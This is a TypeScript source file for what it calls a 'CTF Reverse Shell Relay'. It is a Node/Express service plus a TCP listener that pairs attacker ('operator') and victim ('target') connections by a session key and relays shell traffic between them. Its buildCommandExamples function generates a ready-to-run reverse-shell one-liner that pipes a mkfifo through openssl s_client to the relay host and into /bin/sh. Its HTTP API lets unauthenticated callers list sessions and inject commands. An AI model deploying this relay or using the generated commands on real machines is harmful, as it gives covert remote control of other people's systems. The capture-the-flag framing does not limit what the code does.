import dotenv from "dotenv";
import express, { Router } from "express";
import type { NextFunction, Request, Response } from "express";
import { randomUUID } from "node:crypto";
import net from "node:net";
import process from "node:process";

dotenv.config();

type AppConfig = {
	httpPort: number;
	httpHost: string;
	shellPort: number;
	shellHost: string;
	maxBufferLength: number;
	tunnelHostname?: string;
	tunnelPublicPort: number;
	cloudflaredDownloadBase: string;
	clientProxyHost: string;
	clientProxyPort: number;
	pairingTtlMs: number;
	closedRetentionMs: number;
};

type PairingRole = "operator" | "target";

type PairingStatus =
	| "waiting"
	| "operator_connected"
	| "target_connected"
	| "bridged"
	| "closed";

type PairingLogEntry = {
	seq: number;
	at: string;
	source: PairingRole;
	size: number;
	preview: string;
};

type Pairing = {
	key: string;
	ownerUserId?: string;
	label?: string;
	createdAt: string;
	lastActivityAt: string;
	status: PairingStatus;
	sockets: Partial<Record<PairingRole, net.Socket>>;
	bufferBeforeBridge: Record<PairingRole, Buffer[]>;
	logs: PairingLogEntry[];
	sequence: number;
	closedAt?: string;
	closeReason?: string;
};

function parsePositiveInt(
	value: string | undefined,
	fallback: number,
	label: string
): number {
	const trimmed = value?.trim();
	if (!trimmed) return fallback;
	const parsed = Number.parseInt(trimmed, 10);
	if (!Number.isFinite(parsed) || parsed <= 0) {
		throw new Error(`${label} must be a positive integer`);
	}
	return parsed;
}

function normaliseUrlBase(value: string): string {
	return value.endsWith("/") ? value.slice(0, -1) : value;
}

function loadConfig(): AppConfig {
	const httpPort = parsePositiveInt(
		process.env.HTTP_PORT ?? process.env.PORT,
		3002,
		"HTTP_PORT"
	);
	const shellPort = parsePositiveInt(
		process.env.REVSHELL_LISTEN_PORT,
		9001,
		"REVSHELL_LISTEN_PORT"
	);
	const maxBufferLength = parsePositiveInt(
		process.env.REVSHELL_MAX_BUFFER,
		500,
		"REVSHELL_MAX_BUFFER"
	);
	const tunnelHostname =
		process.env.REVSHELL_ACCESS_HOSTNAME?.trim() ||
		(process.env.DOMAIN ? `revshell.${process.env.DOMAIN.trim()}` : undefined);
	const tunnelPublicPort = parsePositiveInt(
		process.env.REVSHELL_PUBLIC_PORT,
		443,
		"REVSHELL_PUBLIC_PORT"
	);
	const downloadBase = normaliseUrlBase(
		process.env.REVSHELL_CLOUDFLARED_DOWNLOAD_BASE?.trim() ??
			"https://github.com/cloudflare/cloudflared/releases/latest/download"
	);
	const clientProxyPort = parsePositiveInt(
		process.env.REVSHELL_CLIENT_PROXY_PORT,
		9210,
		"REVSHELL_CLIENT_PROXY_PORT"
	);
	const pairingTtlMs = parsePositiveInt(
		process.env.REVSHELL_PAIRING_TTL_MINUTES,
		30,
		"REVSHELL_PAIRING_TTL_MINUTES"
	) * 60 * 1000;
	const closedRetentionMs = parsePositiveInt(
		process.env.REVSHELL_PAIRING_CLOSED_RETENTION_MINUTES,
		10,
		"REVSHELL_PAIRING_CLOSED_RETENTION_MINUTES"
	) * 60 * 1000;

	const clientProxyHost =
		process.env.REVSHELL_CLIENT_PROXY_HOST?.trim() || "127.0.0.1";
	const cfg: AppConfig = {
		httpPort,
		httpHost: process.env.HTTP_HOST ?? "0.0.0.0",
		shellPort,
		shellHost: process.env.REVSHELL_LISTEN_HOST ?? "0.0.0.0",
		maxBufferLength,
		tunnelPublicPort,
		cloudflaredDownloadBase: downloadBase,
		clientProxyHost,
		clientProxyPort,
		pairingTtlMs,
		closedRetentionMs,
	};
	if (tunnelHostname) cfg.tunnelHostname = tunnelHostname;
	return cfg;
}

const config = loadConfig();

const app = express();
app.disable("x-powered-by");
app.use(express.json({ limit: "512kb" }));

app.use((req, res, next) => {
	res.setHeader("Access-Control-Allow-Origin", "*");
	res.setHeader("Access-Control-Allow-Headers", "Content-Type");
	next();
});

const pairings = new Map<string, Pairing>();
const MAX_LOG_ENTRIES = 200;
const MAX_BUFFER_CACHE_SIZE = 256 * 1024; // per role

function otherRole(role: PairingRole): PairingRole {
	return role === "operator" ? "target" : "operator";
}

function createPairing(input: {
	ownerUserId?: string;
	label?: string;
}): Pairing {
	const key = randomUUID().replace(/-/g, "").slice(0, 16);
	const nowIso = new Date().toISOString();
	const pairing: Pairing = {
		key,
		createdAt: nowIso,
		lastActivityAt: nowIso,
		status: "waiting",
		sockets: {},
		bufferBeforeBridge: {
			operator: [],
			target: [],
		},
		logs: [],
		sequence: 0,
	};
	if (input.ownerUserId) pairing.ownerUserId = input.ownerUserId;
	if (input.label) pairing.label = input.label;
	pairings.set(key, pairing);
	return pairing;
}

function summarisePairing(pairing: Pairing) {
	return {
		key: pairing.key,
		ownerUserId: pairing.ownerUserId ?? null,
		label: pairing.label ?? null,
		status: pairing.status,
		createdAt: pairing.createdAt,
		lastActivityAt: pairing.lastActivityAt,
		operatorConnected: Boolean(pairing.sockets.operator),
		targetConnected: Boolean(pairing.sockets.target),
		closedAt: pairing.closedAt ?? null,
		closeReason: pairing.closeReason ?? null,
		logCount: pairing.logs.length,
	};
}

function appendLog(pairing: Pairing, source: PairingRole, chunk: Buffer) {
	const entry: PairingLogEntry = {
		seq: pairing.sequence + 1,
		at: new Date().toISOString(),
		source,
		size: chunk.length,
		preview: chunk.toString("utf8").slice(0, 400),
	};
	pairing.sequence = entry.seq;
	pairing.logs.push(entry);
	if (pairing.logs.length > MAX_LOG_ENTRIES) {
		pairing.logs.splice(0, pairing.logs.length - MAX_LOG_ENTRIES);
	}
}

function bufferDataForRole(
	pairing: Pairing,
	targetRole: PairingRole,
	chunk: Buffer
) {
	const current = pairing.bufferBeforeBridge[targetRole];
	current.push(chunk);
	const totalSize = current.reduce((acc, buf) => acc + buf.length, 0);
	if (totalSize > MAX_BUFFER_CACHE_SIZE) {
		current.splice(0, current.length);
	}
}

function flushBufferedData(pairing: Pairing, role: PairingRole) {
	const socket = pairing.sockets[role];
	if (!socket || socket.destroyed) return;
	const buffers = pairing.bufferBeforeBridge[role];
	while (buffers.length > 0) {
		const chunk = buffers.shift();
		if (!chunk) break;
		socket.write(chunk);
	}
}

function closePairing(pairing: Pairing, reason: string) {
	if (pairing.status === "closed") return;
	pairing.status = "closed";
	pairing.closeReason = reason;
	pairing.closedAt = new Date().toISOString();
	pairing.lastActivityAt = pairing.closedAt;
	for (const role of ["operator", "target"] as PairingRole[]) {
		const socket = pairing.sockets[role];
		if (socket && !socket.destroyed) {
			try {
				socket.destroy();
			} catch (error) {
				console.warn("Failed to destroy socket", error);
			}
		}
	}
	pairing.sockets = {};
}

function handleSocketClosure(pairing: Pairing, role: PairingRole, reason: string) {
	delete pairing.sockets[role];
	pairing.status = pairing.sockets.operator
		? pairing.sockets.target
			? "bridged"
			: "operator_connected"
		: pairing.sockets.target
		? "target_connected"
		: "waiting";
	pairing.lastActivityAt = new Date().toISOString();
	if (!pairing.sockets.operator && !pairing.sockets.target) {
		closePairing(pairing, reason);
	}
}

function bridgeIfReady(pairing: Pairing) {
	const operatorSocket = pairing.sockets.operator;
	const targetSocket = pairing.sockets.target;
	if (!operatorSocket || !targetSocket) return;
	pairing.status = "bridged";
	flushBufferedData(pairing, "operator");
	flushBufferedData(pairing, "target");
}

function registerSocket(
	pairing: Pairing,
	role: PairingRole,
	socket: net.Socket,
	initialData: Buffer
) {
	if (pairing.status === "closed") {
		socket.destroy();
		return;
	}

	const existing = pairing.sockets[role];
	if (existing && !existing.destroyed) {
		socket.destroy();
		return;
	}

	pairing.sockets[role] = socket;
	pairing.lastActivityAt = new Date().toISOString();
	if (pairing.status === "waiting") {
		pairing.status = role === "operator" ? "operator_connected" : "target_connected";
	} else if (pairing.status !== "bridged") {
		pairing.status =
			pairing.sockets.operator && pairing.sockets.target
				? "bridged"
				: pairing.status;
	}

	if (initialData.length > 0) {
		const destRole = otherRole(role);
		targetWrite(pairing, role, initialData, destRole);
	}

	socket.on("data", (chunk: Buffer) => {
		if (chunk.length === 0) return;
		pairing.lastActivityAt = new Date().toISOString();
		appendLog(pairing, role, chunk);
		const destRole = otherRole(role);
		targetWrite(pairing, role, chunk, destRole);
	});

	socket.on("close", () => {
		handleSocketClosure(pairing, role, "socket-closed");
	});

	socket.on("error", (error) => {
		console.warn(`Socket error on pairing ${pairing.key}:`, error);
		handleSocketClosure(pairing, role, "socket-error");
	});

	bridgeIfReady(pairing);
}

function targetWrite(
	pairing: Pairing,
	sourceRole: PairingRole,
	chunk: Buffer,
	targetRole: PairingRole
) {
	const targetSocket = pairing.sockets[targetRole];
	if (targetSocket && !targetSocket.destroyed) {
		targetSocket.write(chunk);
	} else {
		bufferDataForRole(pairing, targetRole, chunk);
	}
}

function cleanupPairings() {
	const now = Date.now();
	for (const pairing of pairings.values()) {
		if (pairing.status === "closed") {
			if (
				pairing.closedAt &&
				now - Date.parse(pairing.closedAt) > config.closedRetentionMs
			) {
				pairings.delete(pairing.key);
			}
			continue;
		}
		const age = now - Date.parse(pairing.createdAt);
		if (age > config.pairingTtlMs) {
			closePairing(pairing, "expired");
		}
	}
}

setInterval(cleanupPairings, 30_000).unref();

const pairingRouter = Router();

pairingRouter.post("/", (req, res) => {
	const { ownerUserId, label } = (req.body ?? {}) as {
		ownerUserId?: string;
		label?: string;
	};
	const createInput: { ownerUserId?: string; label?: string } = {};
	if (ownerUserId) createInput.ownerUserId = ownerUserId;
	if (label) createInput.label = label;
	const pairing = createPairing(createInput);
	const hostCandidate =
		config.tunnelHostname ?? process.env.DOMAIN ?? config.shellHost;
	if (!hostCandidate) {
		res.status(500).json({ error: "LISTENER_UNAVAILABLE" });
		return;
	}
	const commands = buildCommandExamples(
		pairing.key,
		hostCandidate,
		config.tunnelPublicPort
	);
	res.status(201).json({
		pairing: summarisePairing(pairing),
		connection: {
			host: hostCandidate,
			port: config.tunnelPublicPort,
		},
		commands,
	});
});

pairingRouter.get("/", (req, res) => {
	const { ownerUserId } = req.query as { ownerUserId?: string };
	const list = Array.from(pairings.values())
		.filter((pairing) =>
			ownerUserId ? pairing.ownerUserId === ownerUserId : true
		)
		.map((pairing) => summarisePairing(pairing));
	res.json({ pairings: list });
});

pairingRouter.get("/:key", (req, res) => {
	const pairing = pairings.get(req.params.key);
	if (!pairing) {
		res.status(404).json({ error: "PAIRING_NOT_FOUND" });
		return;
	}
	res.json({ pairing: summarisePairing(pairing) });
});

pairingRouter.get("/:key/logs", (req, res) => {
	const pairing = pairings.get(req.params.key);
	if (!pairing) {
		res.status(404).json({ error: "PAIRING_NOT_FOUND" });
		return;
	}
	const after = Number.parseInt(String(req.query.after ?? "0"), 10) || 0;
	const logs = pairing.logs.filter((entry) => entry.seq > after);
	res.json({
		pairing: summarisePairing(pairing),
		logs,
		currentSequence: pairing.sequence,
	});
});

pairingRouter.post("/:key/send", async (req, res) => {
	const pairing = pairings.get(req.params.key);
	if (!pairing) {
		res.status(404).json({ error: "PAIRING_NOT_FOUND" });
		return;
	}
	if (pairing.status === "closed") {
		res.status(410).json({ error: "PAIRING_CLOSED" });
		return;
	}
	const { role = "operator", text, base64 } = (req.body ?? {}) as {
		role?: PairingRole;
		text?: string;
		base64?: string;
	};
	if (role !== "operator" && role !== "target") {
		res.status(400).json({ error: "INVALID_ROLE" });
		return;
	}
	let payload: Buffer | null = null;
	if (typeof text === "string" && text.length > 0) {
		payload = Buffer.from(text, "utf8");
	} else if (typeof base64 === "string" && base64.length > 0) {
		try {
			payload = Buffer.from(base64, "base64");
		} catch (error) {
			res.status(400).json({ error: "INVALID_BASE64" });
			return;
		}
	}
	if (!payload) {
		res.status(400).json({ error: "MISSING_PAYLOAD" });
		return;
	}
	const socket = pairing.sockets[role];
	if (!socket || socket.destroyed) {
		res.status(409).json({ error: "ROLE_NOT_CONNECTED" });
		return;
	}
	socket.write(payload);
	appendLog(pairing, otherRole(role), payload);
	pairing.lastActivityAt = new Date().toISOString();
	res.json({ success: true, bytesSent: payload.length });
});

pairingRouter.post("/:key/close", (req, res) => {
	const pairing = pairings.get(req.params.key);
	if (!pairing) {
		res.status(404).json({ error: "PAIRING_NOT_FOUND" });
		return;
	}
	closePairing(pairing, "closed-by-request");
	res.json({ pairing: summarisePairing(pairing) });
});

app.use("/pairings", pairingRouter);

app.get("/healthz", (_req, res) => {
	const active = Array.from(pairings.values()).filter(
		(pairing) => pairing.status !== "closed"
	);
	res.json({ status: "ok", pairings: active.length });
});

app.get("/", (_req, res) => {
	const host =
		config.tunnelHostname || process.env.DOMAIN || config.shellHost;
	res.json({
		service: "CTF Reverse Shell Relay",
		description:
			"Pairs operator and target netcat clients using a session key and relays traffic between them.",
		listener: {
			host,
			port: config.tunnelPublicPort,
		},
	});
});

app.use((error: unknown, _req: Request, res: Response, next: NextFunction) => {
	if (res.headersSent) {
		next(error);
		return;
	}
	console.error("Unhandled error in reverse shell API:", error);
	res.status(500).json({ error: "INTERNAL_ERROR" });
});

const tcpServer = net.createServer((socket) => {
	socket.setKeepAlive(true, 30_000);
	socket.setNoDelay(true);
	let handshakeComplete = false;
	let pairing: Pairing | null = null;
	let role: PairingRole | null = null;
	let buffer = Buffer.alloc(0);
	const authTimeout = setTimeout(() => {
		socket.destroy();
	}, 10_000);

	const cleanup = () => {
		clearTimeout(authTimeout);
	};

	socket.on("data", (chunk: Buffer) => {
		if (!handshakeComplete) {
			buffer = Buffer.concat([buffer, chunk]);
			const newlineIndex = buffer.indexOf(0x0a);
			if (newlineIndex === -1) {
				if (buffer.length > 2048) {
					socket.destroy();
				}
				return;
			}
			const line = buffer.slice(0, newlineIndex).toString("utf8").trim();
			const remaining = buffer.slice(newlineIndex + 1);
			buffer = Buffer.alloc(0);
			const parts = line.split(/\s+/);
			const keyword = (parts[0] ?? "").toUpperCase();
			const keyValue = parts[1];
			if (keyword !== "AUTH" || !keyValue) {
				socket.destroy();
				return;
			}
			const key = keyValue;
			const rawRole = (parts[2] ?? "target").toLowerCase();
			if (rawRole !== "operator" && rawRole !== "target") {
				socket.destroy();
				return;
			}
			const targetPairing = pairings.get(key);
			if (!targetPairing || targetPairing.status === "closed") {
				socket.destroy();
				return;
			}
			handshakeComplete = true;
			pairing = targetPairing;
			role = rawRole as PairingRole;
			cleanup();
			registerSocket(pairing, role, socket, remaining);
			return;
		}
		if (!pairing || !role) return;
		// Already handled in registerSocket via socket listener; leftover general data handled there
	});

	socket.on("close", () => {
		cleanup();
	});

	socket.on("error", () => {
		cleanup();
	});
});

tcpServer.on("error", (error) => {
	console.error("Reverse shell TCP server error:", error);
});

function buildCommandExamples(key: string, host: string, port: number) {
	const operatorCmd = `(printf 'AUTH ${key} operator\\n'; cat) | openssl s_client -quiet -connect ${host}:${port}`;
	const fifoName = `/tmp/.rs-${key.slice(0, 6)}`;
	const targetCmd = `mkfifo ${fifoName} 2>/dev/null; (printf 'AUTH ${key} target\\n'; cat ${fifoName}) | openssl s_client -quiet -connect ${host}:${port} | /bin/sh > ${fifoName} 2>&1`;
	return {
		operator: operatorCmd,
		target: targetCmd,
	};
}

tcpServer.listen(config.shellPort, config.shellHost, () => {
	console.log(
		`Reverse shell TCP listener active on ${config.shellHost}:${config.shellPort}`
	);
});

const httpServer = app.listen(config.httpPort, config.httpHost, () => {
	console.log(
		`Reverse shell API listening on ${config.httpHost}:${config.httpPort}`
	);
});

function shutdown(signal: string) {
	console.log(`Received ${signal}, beginning graceful shutdown`);
	httpServer.close(() => console.log("HTTP server closed"));
	tcpServer.close(() => console.log("TCP listener closed"));
	for (const pairing of pairings.values()) {
		closePairing(pairing, `shutdown:${signal}`);
	}
}

process.on("SIGINT", () => shutdown("SIGINT"));
process.on("SIGTERM", () => shutdown("SIGTERM"));
